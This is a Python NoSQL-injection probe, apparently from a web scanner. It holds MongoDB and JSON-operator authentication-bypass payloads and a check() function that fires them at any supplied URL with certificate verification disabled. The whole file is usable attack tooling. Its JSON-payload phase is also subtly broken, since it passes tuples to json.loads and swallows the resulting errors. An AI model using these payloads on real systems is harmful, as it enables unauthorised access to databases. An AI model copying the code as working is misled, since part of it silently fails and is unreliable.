import re, time
from typing import Optional
import requests

NOSQLI_PAYLOADS = {
    "mongodb": [
        ("' || '1'=='1' /*", 0),
        ("' || 1==1 //", 0),
        ('" || "1"=="1" //', 0),
        ("' && this.cred == '' //", 0),
        ("admin' || 1==1 //", 0),
        ("admin' --", 0),
        ('" || "1"=="1', 0),
        ("'; return true; //", 0),
    ],
    "nosql_json": [
        ('{"$ne": ""}', 0),
        ('{"$gt": ""}', 0),
        ('{"$regex": ".*"}', 0),
        ('{"$ne": null}', 0),
    ],
}

NOSQLI_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoDB",
    r"Uncaught MongoDB",
    r"Invalid JSON",
    r"Unexpected token",
    r"ArangoError",
    r"arangosh",
    r"Couchbase",
    r"Cassandra",
    r"RethinkDB",
    r"Firebase",
    r"Invalid BSON",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None}

    try:
        sep = "&" if "?" in url else "?"
        r_base = sess.get("%s%s%s=%s" % (url, sep, param, "1"),
                          timeout=timeout, verify=False)
        base_len = len(r_base.text)
        base_status = r_base.status_code
    except:
        base_len = 0
        base_status = 0

    for payload, _ in NOSQLI_PAYLOADS.get("mongodb", []):
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                         timeout=timeout, verify=False)
            diff = abs(len(r.text) - base_len)
            if diff > 30 or r.status_code != base_status:
                result["vulnerable"] = True
                result["type"] = "boolean"
                result["evidence"].append("nosqli: %s (%d diff)" % (payload[:20], diff))
                result["payload"] = payload
                break
            for pat in NOSQLI_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "error"
                    result["evidence"].append("nosqli error: %s" % pat[:20])
                    result["payload"] = payload
                    break
        except:
            pass
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        for payload in NOSQLI_PAYLOADS.get("nosql_json", []):
            try:
                import json as _j
                r = sess.post(url, json={param: _j.loads(payload)},
                              timeout=timeout, verify=False)
                if r.status_code == 200 and len(r.text) > base_len + 10:
                    result["vulnerable"] = True
                    result["type"] = "json"
                    result["evidence"].append("nosqli json: %s" % payload[:20])
                    result["payload"] = payload
                    break
            except:
                pass

    return result
